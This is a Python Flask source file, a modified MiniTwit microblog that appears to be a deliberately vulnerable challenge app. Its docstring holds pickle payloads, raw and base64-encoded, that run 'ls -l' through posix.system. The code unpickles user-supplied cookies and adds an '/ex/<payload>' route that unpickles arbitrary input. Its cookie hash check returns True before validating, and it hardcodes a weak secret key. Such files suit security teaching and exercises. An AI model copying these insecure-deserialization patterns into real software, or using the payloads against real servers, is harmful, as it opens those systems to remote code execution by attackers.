# -*- coding: utf-8 -*-
"""
    MiniTwit
    ~~~~~~~~

    A microblogging application written with Flask and sqlite3.

    :copyright: (c) 2015 by Armin Ronacher.
    :license: BSD, see LICENSE for more details.
"""

"""

d = pickle.loads("S'bla:bla:bla'\np0\ncposix\nsystem\np1\n(S'ls -l'\np2\ntp3\nRp4\n."


V1:3518a1b391035945d7a95d0c20d0d5ad537ef22c:soka\np0\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\xc8\ncposix\nsystem\np1\n(S'ls -l'\np2\ntp3\nRp4\n.

VjE6MzUxOGExYjM5MTAzNTk0NWQ3YTk1ZDBjMjBkMGQ1YWQ1MzdlZjIyYzpzb2thCnAwgAAAAAAA%0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%0AAAAAAAAAAcgKY3Bvc2l4CnN5c3RlbQpwMQooUydscyAtbCcKcDIKdHAzClJwNAou

"""
import base64
import pickle, os
import time
from sqlite3 import dbapi2 as sqlite3
from hashlib import md5, sha1
from datetime import datetime
from flask import Flask, request, session, url_for, redirect, \
     render_template, abort, g, flash, _app_ctx_stack, after_this_request
from werkzeug import check_password_hash, generate_password_hash

import threading
import Queue



# configuration
DATABASE = '/tmp/minitwit.db'
PER_PAGE = 30
DEBUG = True
SECRET_KEY = 'development key'
COOKIE_KEY = '123456'

# create our little application :)
app = Flask(__name__)
app.config.from_object(__name__)
app.config.from_envvar('MINITWIT_SETTINGS', silent=True)


def get_db():
    """Opens a new database connection if there is none yet for the
    current application context.
    """
    top = _app_ctx_stack.top
    if not hasattr(top, 'sqlite_db'):
        top.sqlite_db = sqlite3.connect(app.config['DATABASE'])
        top.sqlite_db.row_factory = sqlite3.Row
    return top.sqlite_db


@app.teardown_appcontext
def close_database(exception):
    """Closes the database again at the end of the request."""
    top = _app_ctx_stack.top
    if hasattr(top, 'sqlite_db'):
        top.sqlite_db.close()


def init_db():
    """Initializes the database."""
    db = get_db()
    with app.open_resource('schema.sql', mode='r') as f:
        db.cursor().executescript(f.read())
    db.commit()


@app.cli.command('initdb')
def initdb_command():
    """Creates the database tables."""
    init_db()
    print('Initialized the database.')


def query_db(query, args=(), one=False):
    """Queries the database and returns a list of dictionaries."""
    cur = get_db().execute(query, args)
    rv = cur.fetchall()
    return (rv[0] if rv else None) if one else rv


def get_user_id(username):
    """Convenience method to look up the id for a username."""
    rv = query_db('select user_id from user where username = ?',
                  [username], one=True)
    return rv[0] if rv else None


def format_datetime(timestamp):
    """Format a timestamp for display."""
    return datetime.utcfromtimestamp(timestamp).strftime('%Y-%m-%d @ %H:%M')


def gravatar_url(email, size=80):
    """Return the gravatar image for the given email address."""
    return 'http://www.gravatar.com/avatar/%s?d=identicon&s=%d' % \
        (md5(email.strip().lower().encode('utf-8')).hexdigest(), size)


@app.before_request
def before_request():
    g.user = None
    if 'user_id' in session:
        g.user = query_db('select * from user where user_id = ?',
                          [session['user_id']], one=True)


@app.route('/')
def timeline():
    """Shows a users timeline or if no user is logged in it will
    redirect to the public timeline.  This timeline shows the user's
    messages as well as all the messages of followed users.
    """

    cookies = getCookie(request)
    infos = {'logged' : False, 'username': '', 'msg': ''}

    if len(cookies) > 1:
        #print "user_info : %s\nsession_hash : %s" % (cookies['user_info'], cookies['session_hash'])
        if checkCookieWithHash(cookies['user_info'], cookies['session_hash']):
            #user_info = threading.Thread(target=loadCookies, args=(base64.b64decode(cookies['user_info']),)).start()
            
            user_info = loadCookies(base64.b64decode(cookies['user_info']))
            if user_info is not None:
                try:
                    print user_info
                    user_info = user_info.split(':')
                    if loginWithCookies(user_info[2], user_info[1]):
                        infos['logged'] = True
                        infos['username'] = user_info[2]
                    else:
                        infos['msg'] = "Invalid login/password in cookies (strange)"
                except:
                    infos['msg'] = "An error occured"
            else:
                infos['msg'] = "Pickle error"
        else:
            infos['msg'] = "Hacking attempted !<br>Nice try but the session_hash protects our system from your attacks:<br>session_hash=sha1(secret + user_info)"

    return render_template('layout.html', infos=infos)



@app.route('/ex/<payload>')
def exploit(payload):
    """Displays the latest messages of all users."""
    #msg = payload + "  " + sha1(COOKIE_KEY + payload).hexdigest()
    msg = base64.b64decode(payload)
    print repr(msg)
    msg = sha1(COOKIE_KEY + msg).hexdigest()
    d = pickle.loads(payload.decode('base64'))
    return render_template('payload.html', message=msg)


@app.route('/<username>')
def user_timeline(username):
    """Display's a users tweets."""
    profile_user = query_db('select * from user where username = ?',
                            [username], one=True)
    if profile_user is None:
        abort(404)
    followed = False
    if g.user:
        followed = query_db('''select 1 from follower where
            follower.who_id = ? and follower.whom_id = ?''',
            [session['user_id'], profile_user['user_id']],
            one=True) is not None
    return render_template('timeline.html', messages=query_db('''
            select message.*, user.* from message, user where
            user.user_id = message.author_id and user.user_id = ?
            order by message.pub_date desc limit ?''',
            [profile_user['user_id'], PER_PAGE]), followed=followed,
            profile_user=profile_user)


@app.route('/login', methods=['GET', 'POST'])
def login():
    """Logs the user in."""
    error = None
    if request.method == 'POST':
        user = query_db('''select * from user where
            username = ?''', [request.form['username']], one=True)
        if user is None:
            error = 'Invalid username'
        elif not check_password_hash(user['pw_hash'],
                                     request.form['password']):
            error = 'Invalid password'
        else:
            setCookie(user['user_id'], user['username'], user['pw_hash'])
            return redirect(url_for('timeline'))
            
    return render_template('login.html', error=error)

def loginWithCookies(username, password):
    user = query_db('''select * from user where username = ?''', [username], one=True)
    if user is None:
        return False
    elif not check_password_hash(user['pw_hash'], username):
        return False
    else:
        return True


@app.route('/register', methods=['GET', 'POST'])
def register():
    """Registers the user."""    
    error = None
    if request.method == 'POST':
        if not request.form['username']:
            error = 'You have to enter a username'
        elif not request.form['email'] or \
                '@' not in request.form['email']:
            error = 'You have to enter a valid email address'
        elif not request.form['password']:
            error = 'You have to enter a password'
        elif request.form['password'] != request.form['password2']:
            error = 'The two passwords do not match'
        elif get_user_id(request.form['username']) is not None:
            error = 'The username is already taken'
        else:
            db = get_db()
            db.execute('''insert into user (
              username, email, pw_hash) values (?, ?, ?)''',
              [request.form['username'], request.form['email'],
               generate_password_hash(request.form['password'])])
            db.commit()
            flash('You were successfully registered and can login now')
            return redirect(url_for('login'))
    return render_template('register.html', error=error)


@app.route('/logout')
def logout():
    @after_this_request
    def add_header(response):
        response.set_cookie('user_info', value='', expires=0)
        response.set_cookie('session_hash',value='', expires=0 )
        return response
    session.pop('user_id', None)
    return redirect(url_for('timeline'))

def setCookie(user_id, username, password):
    @after_this_request
    def add_header(response):
        seria = pickle.dumps(str(user_id) + ':' + sha1(password).hexdigest() + ':' + username)
        cookie = base64.b64encode(seria.replace('.', ''))
        response.set_cookie('user_info', value=cookie)
        response.set_cookie('session_hash',value=sha1(COOKIE_KEY + cookie).hexdigest() )

        return response
    return 'OK'

def getCookie(request):
    return request.cookies

def checkCookieWithHash(cookie, hash):
    return True
    if sha1(COOKIE_KEY + cookie).hexdigest() == hash:
        return True
    return False

def loadCookies(user_info):
    try:
        return pickle.loads(user_info + '.')
    except:
        return None

#def isSessionCookie(request):




#def autoLogin():


# add some filters to jinja
app.jinja_env.filters['datetimeformat'] = format_datetime
app.jinja_env.filters['gravatar'] = gravatar_url
app.run(threaded=True, port=5000)
